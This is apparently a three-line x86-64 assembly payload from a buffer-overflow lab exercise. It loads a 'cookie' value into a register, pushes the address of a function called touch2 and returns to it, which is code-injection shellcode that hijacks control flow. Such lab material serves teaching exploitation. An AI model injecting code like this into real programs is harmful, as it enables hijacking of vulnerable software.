movq  $0x59b997fa,%rdi ; make rdi store our cookie value
pushq $0x4017ec ; push the address of touch 2 into the stack
retq ; return to touch2()